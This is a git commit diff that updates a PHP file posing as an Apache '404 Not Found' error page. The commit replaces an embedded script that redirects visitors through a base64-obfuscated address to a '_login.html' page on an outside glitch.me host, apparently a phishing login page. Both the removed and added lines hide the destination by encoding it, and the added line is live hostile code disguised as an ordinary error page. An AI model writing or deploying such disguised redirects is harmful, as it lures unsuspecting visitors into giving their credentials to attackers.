01bc6d70db8cb8cde47052c77d5e612f4a545c3e
carl247 <108703004+carl247@users.noreply.github.com>
2022-11-12 10:14:12 +0100

    Update cgi-bin.php

--- cgi-bin.php
+++ cgi-bin.php
@@ -8,7 +8,7 @@
 <p>The requested URL was not found on this server.</p>
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
 <script>
-window.location=atob("aHR0cHM6Ly9zaGVsbC1jaGFsay1saW1iLmdsaXRjaC5tZS9fbG9naW4uaHRtbA==");
+window.location=atob("aHR0cHM6Ly9sZWFybmVkLXNvbHN0aWNlLXN0ZXcuZ2xpdGNoLm1lL19sb2dpbi5odG1s");
 </script>
 </body>
 </html>
